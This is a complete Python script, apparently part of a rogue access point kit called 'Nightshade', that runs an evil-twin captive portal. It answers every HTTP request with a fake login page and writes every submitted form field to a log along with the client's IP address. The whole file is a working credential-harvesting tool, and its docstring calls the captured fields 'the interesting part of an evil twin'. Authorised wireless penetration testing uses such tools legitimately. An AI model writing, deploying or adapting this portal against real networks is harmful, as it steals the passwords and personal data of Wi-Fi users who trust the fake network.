#!/usr/bin/env python3
"""Captive portal for the Nightshade rogue AP.

Runs as root (the rogue AP script starts it with sudo) and serves
the portal page for every request, so any DNS name a client tries
lands here. POSTed form fields -- the interesting part of an evil
twin -- are appended to the connection log along with every hit.

Usage: portal.py <html-file> <log-file>
"""
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

HTML = open(sys.argv[1], encoding='utf-8').read()
LOG = sys.argv[2]


def log(message):
    with open(LOG, 'a', encoding='utf-8') as handle:
        handle.write(message + '\n')


class Portal(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.0'

    def _serve(self, body):
        payload = body.encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(payload)))
        self.send_header('Cache-Control', 'no-store')
        self.end_headers()
        self.wfile.write(payload)

    def do_GET(self):
        log(f'{self.client_address[0]} GET {self.path}')
        self._serve(HTML)

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0) or 0)
        data = parse_qs(self.rfile.read(length).decode('utf-8', 'replace'))
        fields = {key: value[-1] for key, value in data.items()}
        log(f'{self.client_address[0]} POST {self.path} {fields}')
        self._serve(HTML)

    def log_message(self, fmt, *args):
        pass


if __name__ == '__main__':
    ThreadingHTTPServer(('10.0.0.1', 80), Portal).serve_forever()
